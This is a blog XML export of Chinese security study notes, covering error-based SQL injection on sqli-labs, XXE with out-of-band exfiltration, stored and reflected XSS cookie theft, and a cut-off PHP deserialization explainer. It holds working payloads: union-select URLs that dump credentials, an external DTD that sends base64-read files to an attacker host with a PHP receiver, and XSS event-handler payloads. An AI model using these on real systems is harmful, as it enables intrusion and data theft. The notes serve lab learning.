‘o?’。请注意在逗号和两个数之间不能有空格。</p><p>\d<br>匹配一个数字字符。</p><p>\D<br>匹配一个非数字字符。</p><p>\d<br>匹配一个数字字符。</p><p>\D<br>匹配一个非数字字符。</p><p>\f<br>匹配一个换页符。</p><p>\n<br>匹配一个换行符。</p><p>\r<br>匹配一个回车符。</p><p>\s<br>匹配任何空白字符，包括空格、制表符、换页符等等。</p><p>\S<br>匹配任何非空白字符。</p><p>\w<br>匹配字母、数字、下划线。</p><p>\W<br>匹配非字母、数字、下划线。</p><hr><h3 id="记得在php中使用正则表达式用-分界！"><a href="#记得在php中使用正则表达式用-分界！" class="headerlink" title="记得在php中使用正则表达式用/分界！"></a>记得在php中使用正则表达式用/分界！</h3>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入：显错注入</title>
      <link href="/2019/12/07/zhengze/"/>
      <url>/2019/12/07/zhengze/</url>
      
        <content type="html"><![CDATA[<p><br>(在这里我们用sqli-lab为例)<br><br><strong>我们首先要检查是否会有注入漏洞，and 1=1法显示不出错误信息，我们尝试用’测试，发现出现错误信息，也证明有注入漏洞。<br></strong><br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/sxw6wE4Na9CwDf2J95VFD5xdrWGvCDy8zYhOwrWEgRY!/b/dFIBAAAAAAAA&amp;bo=gQb5AIEG.QADCSw!&amp;rf=viewer_4" alt><br><strong><br>我们根据错误信息知道多出一个多余的’ 那我们应该怎么样才能使多余的’ 语法让sql语句正确回显呢?<br></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure></p><p><strong>我们通过注释后面的语句注释掉，使得引号闭合；</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4tl2YYuvPIdxpHq7.lhk5zQhLLEB8fqesx4UuLyV.PU!/b/dFMBAAAAAAAA&amp;bo=IgVTASIFUwEDGTw!&amp;rf=viewer_4" alt><br><strong>测试字段数,发现order by 4出错，3则正常显示，说明字段为3<br>（order by 是mysql用来排序的，我们可以通过他来测试字段数）：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos; order by 3--+</span><br></pre></td></tr></table></figure><p><strong>测试回显点，发现回显位是2，3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/u7xpdeuVSeeKngk.j13h3LAfU1eMVgdCH9T.CWlDrHo!/b/dL8AAAAAAAAA&amp;bo=qwShAAAAAAADByw!&amp;rf=viewer_4" alt></p><p><strong>查询版本号，如果是5.0以上,则可以用系统库查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,version()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.kj.wKY22UkPB5mLbk*udHdjiJAigOznbz0cagNMwHY!/b/dLgAAAAAAAAA&amp;bo=EAXjAAAAAAADB9Q!&amp;rf=viewer_4" alt></p><p><strong>查询数据库名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,database()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.5pOBR2yPrgiR7sZUOs61G1LI6Xy58TDwHEpGb6Lb2g!/b/dFQBAAAAAAAA&amp;bo=NgbXAAAAAAADF9U!&amp;rf=viewer_4" alt><br><strong>通过数据库 系统库information的tables表查询表名(查询下个表，可以通过移动偏移量limit来查询其他表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/F5g.75Q1PLQjwcFR2.hGo5O2VJ1mX0GKK4WHq7Pf9D8!/b/dL8AAAAAAAAA&amp;bo=5wTDAAAAAAADFxI!&amp;rf=viewer_4" alt></p><p><strong>再通过数据库 系统库的columns表查询列名，通过偏移limit来查询其他字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/fogWx.4zppoo.XE51.8tPeW1tXIixEwyu.UH0prXdoA!/b/dLYAAAAAAAAA&amp;bo=zAStAAAAAAADF1c!&amp;rf=viewer_4" alt></p><p><strong>再来爆出字段里的内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,username,password from users limit 0,1--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8LCHPGYOTX9e53SycijT5Py2a73o5bRbPKRZ3eFnNtQ!/b/dL8AAAAAAAAA&amp;bo=pAXIAAAAAAADB0s!&amp;rf=viewer_4" alt></p><h1 id="group-concat函数："><a href="#group-concat函数：" class="headerlink" title="group_concat函数："></a>group_concat函数：</h1><p>group_concat函数的作用将同一个分组中的值连接起来，返回一个字符串结果，这样我们就不用麻烦的去移动偏移量了。<br><a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">函数具体介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE-实体注入</title>
      <link href="/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p><strong>XXE即外部实体，从安全角度理解为XML外部实体注入攻击</strong></p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg" alt></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h4 id="内部DTD声明"><a href="#内部DTD声明" class="headerlink" title="内部DTD声明:"></a>内部DTD声明:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h4 id="引用外部DTD声明"><a href="#引用外部DTD声明" class="headerlink" title="引用外部DTD声明:"></a>引用外部DTD声明:</h4><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>或者</p><p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;s</code></p><p><strong>实例</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><h3 id="1-一个外部实体声明"><a href="#1-一个外部实体声明" class="headerlink" title="1. 一个外部实体声明"></a>1. <strong>一个外部实体声明</strong></h3><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h3 id="2-一个内部实体声明"><a href="#2-一个内部实体声明" class="headerlink" title="2. 一个内部实体声明"></a>2. <strong>一个内部实体声明</strong></h3><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><p><strong>实体又分为一般实体和参数实体:</strong></p><ul><li>一般实体的声明语法:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；</p><ul><li>参数实体只能在DTD中使用，参数实体的声明格式： </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：%实体名；</p><p><strong>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</strong></p><p><strong>简单XXE攻击payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=&apos;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;&apos;;</span><br><span class="line">$obj=simplexml_load_string($test,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>test是一个变量，里面是XML，访问读取了C盘的1.txt然后使用simplexml_load_string将其转换为对象打印出来</strong></p><h2 id="simplexml-load-string-函数"><a href="#simplexml-load-string-函数" class="headerlink" title="simplexml_load_string()函数"></a>simplexml_load_string()函数</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>把 XML 字符串载入对象中</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_string(_data,classname,options,ns,is_prefix_ );</span><br></pre></td></tr></table></figure><p>第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMlement这个类，然后LIBXML_NOET是代替实体，然后去调用文件c盘下1.txt。</p><p>在实战中后端语言解析了XML是不会输出读取内容的，我们需要一个类似接受平台的接收器，将XML读取的数据发送到接收平台，然后接受平台储存然后我们在接受平台上分析。先<strong>使用PHP伪协议读取文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后<strong>去调用 用来XXE的服务器中的一个xml文档文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/1.xml&quot;&gt;</span><br></pre></td></tr></table></figure><p>而这个XML写的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/2.php?</span><br><span class="line">id=%file;&apos;&gt;&quot;</span><br><span class="line">\&gt;</span><br><span class="line">%all;      //调用实体</span><br></pre></td></tr></table></figure><p><strong>1.XML文档会调用2.php文件并向id通过GET方式传入%file 读取的内容</strong><br>而2.php的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>2.php被调用后会将id传进来的参数即%file的内容写入到3.php中，我们就可以通过访问3.php得到我们想读取的内容；</p><h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz0zbfttj31h00qm758.jpg" alt><br>进入XXE靶场（外部实体注入），我们发现了<strong>simplexml_load_string()函数</strong>，这里很可能有XXE漏洞，我们看了下附件代码件：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1dhaqqj317w0npwn1.jpg" alt><br>发现这里通过$poststr接收数据并将数据直接放入到simplexml_load_string()转换为对象，那这里是可以进行XXE的；</p><p>我们先构造出XXE的poc代码：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1pp4y0j313v05lt9p.jpg" alt><br>第三行是通过php伪协议去读取<strong>被攻击服务器</strong>下的<strong>flag.php</strong>文件内容（base64编码，方便数据传输）</p><p>第四行是通过外部实体声明加载<strong>攻击者服务器</strong>的<strong>1.xml</strong>文件</p><p>第五行调用外部实体remote</p><p>第六行调用外部实体send</p><p><strong>1.xml</strong>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line"> \&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><strong>调用2.php并传入参数</strong></p><p><strong>2.php内容如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>将传参的内容，即读取到的文件写入放到3.txt中，成功读取文件</p><p>抓包，通过POST方式上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz21z8wsj31h60ra0y4.jpg" alt><br>访问攻击者（即自己）的服务器，看看3.txt是否收到读取的文件<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz2cygdgj31h30psdfu.jpg" alt><br>成功读取到文件，因为之前对其进行base64编码，所以进行base64解码即可得到原来的内容！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>存储型XSS</title>
      <link href="/2019/12/07/XSS2/"/>
      <url>/2019/12/07/XSS2/</url>
      
        <content type="html"><![CDATA[<p>XSS(跨站脚本攻击)的原理其实我已经在上篇文章说过了，所以我就不详细解释了，我们就说说xss漏洞的两大根本条件：</p><ul><li>用户要能控制输入，</li><li>原本程序要执行的html代码，拼接了用户输入的数据</li></ul><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>指嵌入web页面的恶意html代码被存进了应用服务器端去，也就是说被存储到数据库中去，在每次有人访问这个页面，都会自动触发恶意代码，并且能够持续的攻击用户，所以也称为持久型；</p><p>我们通常是通过一个弹窗去检验是否存在XSS,如果有XSS漏洞，我们通常会使用XSS平台去获取对方cookie，网上XSS平台其实有很多，自行搜索即可；</p><h3 id="存储型XSS可能触发的地方"><a href="#存储型XSS可能触发的地方" class="headerlink" title="存储型XSS可能触发的地方"></a>存储型XSS可能触发的地方</h3><ul><li>任何可以插入到数据库的地方</li><li>注册提交框</li><li>留言板</li><li>上传文件的文件名</li><li>报错日志信息(管理员可见)<br>……</li></ul><p>我们通过<a href="http://117.41.229.122:8004/Feedback.asp" target="_blank" rel="noopener">掌控安全公开课靶场</a>为例：<br>我们点击网页一看，看见有个留言板，那我们在想这里会不会有没有xss?<br>我们通过弹窗去测试有没有XSS漏洞：</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/7*uFk3MvsKFG57tovZNgRkkCqVvvqiRXK7Cg.PzBVHo!/b/dMAAAAAAAAAA&amp;bo=swTKAwAAAAADJ3w!&amp;rf=viewer_4" alt></p><p>发现出现弹窗</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Jc8TcgJNtMElfIS6K0NoUpudHzE6xCirF8XnLuQStHY!/b/dFMBAAAAAAAA&amp;bo=dgQ9AQAAAAADF3w!&amp;rf=viewer_4" alt></p><p>我们发现我们输入的代码已经被插入html代码块里面去了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/wMq3UQ0gc93UieaE5eIkqd2UWTNL*5d2oCrytVsRng4!/b/dAgBAAAAAAAA&amp;bo=yQHFAAAAAAADFz8!&amp;rf=viewer_4" alt></p><p>因为XSS payload代码复杂，所以我们通常是使用xss平台去获取cookie<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JoeGc63sW7v3Qz1e4O7F0yJIUboQItBj7hn2Ls9zYks!/b/dLYAAAAAAAAA&amp;bo=1gbGAQAAAAADFyU!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XKbLcqw40gOT5tuCQDQ3asbNCMMrPwn1g1GO4xbf*A!/b/dL8AAAAAAAAA&amp;bo=uQVmAwAAAAADF.s!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/2LotA1LS9E1m5Ra1m3X15yDrDTYZqJmezvdQJ.BjnHs!/b/dDcBAAAAAAAA&amp;bo=MQU*AwAAAAADFzo!&amp;rf=viewer_4" alt></p><p>我们将平台上的payload复制，插入到有xss漏洞的留言框去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/zsEOEET*L*0nIJ1hX1LePGgHNif.mbwTuOyRFNYFx.c!/b/dFYBAAAAAAAA&amp;bo=egMuAwAAAAADF2Y!&amp;rf=viewer_4" alt></p><p>插入成功后，我们查看xss平台，成功拿到管理员cookie</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/U5uylpL*PqLh2*jjkg1FVvjQZ8*NMIB*b10X78I1hFA!/b/dMIAAAAAAAAA&amp;bo=swRbAgAAAAADF9w!&amp;rf=viewer_4" alt></p><p><strong>其实xss漏洞出现在留言框上，还可能出现在上传文件名或注册页面框等与插入数据库的提交框上，我们可以通过js弹窗进行测试！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss原理与分析</title>
      <link href="/2019/12/07/xss1/"/>
      <url>/2019/12/07/xss1/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS编码绕过-浏览器的解析顺序："><a href="#XSS编码绕过-浏览器的解析顺序：" class="headerlink" title="XSS编码绕过-浏览器的解析顺序："></a>XSS编码绕过-浏览器的解析顺序：</h2><ul><li>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别哪些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。</li></ul><p><strong>基本的解析顺序</strong>是-&gt;URL 解析，HTML 解析， CSS 解析，JS解析;</p><p>浏览器每次收到数据后都会进行语法的分析，如果分析到合法符号就将其添加到解析树中去，语法在解析生成dom树，解析过程中开始对css元素进行渲染，然后再去执行js，而在dom树在加载过程中，DOM节点也在慢慢建立起来了，所有的节点都均可被修改，创建，或删除。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/PSIywenNZEoKq2vFYg4V4d*sLChskvPr8y.Rkjmlv1c!/b/dL8AAAAAAAAA&amp;bo=9AJOAQAAAAARB4k!&amp;rf=viewer_4" alt></p><h2 id="什么是XSS："><a href="#什么是XSS：" class="headerlink" title="什么是XSS："></a>什么是XSS：</h2><p>XSS其实就是通过插入html代码进行拼接注入，通过插入html代码去执行带有恶意的js代码；</p><h2 id="XSS的作用："><a href="#XSS的作用：" class="headerlink" title="XSS的作用："></a>XSS的作用：</h2><ul><li>盗取管理员cookie</li><li>获得内网的ip</li><li>获取浏览器保存的明文密码</li><li>截取网页的屏幕</li><li>网页的键盘输入记录</li><li>……</li></ul><p>##XSS的类型：</p><ul><li><strong>反射型XSS：</strong>实现xss攻击，但不存进数据库，只对你这次访问有影响，是中非持久型的攻击（一次性的）；</li><li><strong>存储型：</strong>实现了xss攻击，但存进了数据库，每次有人访问这个页面，都会自动触发；</li><li><strong>DOM型XSS：</strong>不经过后端，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，dom – xss是通过url传入参数去控制触发的。</li></ul><h3 id="检测是否存在XSS："><a href="#检测是否存在XSS：" class="headerlink" title="检测是否存在XSS："></a>检测是否存在XSS：</h3><p>最简单的就是构造语句，使页面弹窗，我们在正常页面传参构造参数使他弹窗，如果弹窗，这证明就是存在xss；</p><p><strong>xss其实是通过执行js的代码去执行一些恶意代码，其实有多种方法去执行js语句：</strong></p><ul><li>我们可以通过构造js标签对<script></script>去执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alter&apos;123456&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>也可以通过JavaScript伪协议去触发即声明URL的主体是任意的javascript代码；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;a href=javascript:alter(123456)&gt;1&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li>也可以通过事件去触发(就是加载文档或图像时触发了事件时去再执行js代码,常见有onload(成功加载执行)，onerror(加载失败执行)，oninput(输入时执行),onclick(点击时执行))；</li></ul><p>通过插入错误的图片路径，使他加载失败时去执行js代码：</p><pre><code>?id=&lt;img src=&apos;6666&apos; onerror=alert&apos;123456&apos;&gt;</code></pre><p>以上举例都是属于反射型的xss，需要手动去执行，然后触发我们去插入的代码效果；</p><p>当然还有许多转义的情况存在，我们需要一步步检查，想办法去变形绕过，从而去执行我们想要的结果；</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP unserialize反序列化漏洞</title>
      <link href="/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是序列化-serialize"><a href="#什么是序列化-serialize" class="headerlink" title="什么是序列化(serialize)?"></a>什么是序列化(serialize)?</h2><p>序列化(serialize)是将对象的状态信息<strong>转换为可以存储或传输</strong>的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区，然后<strong>可以从存储区读取或反序列化出对象的状态，</strong>重新将对象创建出来。通俗的说，就是将php中对象、类、数组、变量匿名函数转化为字符串，方便保存到数据库或文件中。</p><p>在php中，可以通过serialize()函数来将对象转变成一个字符串，保存对象的值，方便之后使用或传递。</p><h2 id="什么是反序列化-unserialize"><a href="#什么是反序列化-unserialize" class="headerlink" title="什么是反序列化(unserialize)?"></a>什么是反序列化(unserialize)?</h2><p>序列化就是将对象的状态信息转为字符串存储起来，那么反序列化就是再将信息状态拿出来使用(重新转化为对象或者其他)；</p><h2 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h2><p>本质上serialize()和unserialize()在PHP内部实现上时没有漏洞的，漏洞的**主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p><p>当传给unserialize()的<strong>参数可控</strong>时,那么用户就可以精心构造的payload。当进行反序列化的时候就有可能会触发对象中一些<strong>魔术方法</strong>，造成意向不到的危害。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wfphoej31hc0q876u.jpg" alt><br><strong>序列化对于不同类型得到的字符串格式为：</strong></p><ul><li>String : s:size:value;</li><li>Integer : i:value;</li><li>Boolean : b:value;(1或0)</li><li>Null : N;</li><li>Array : a:size:{key definition;value definition;(repeated per element)}</li><li>Object : 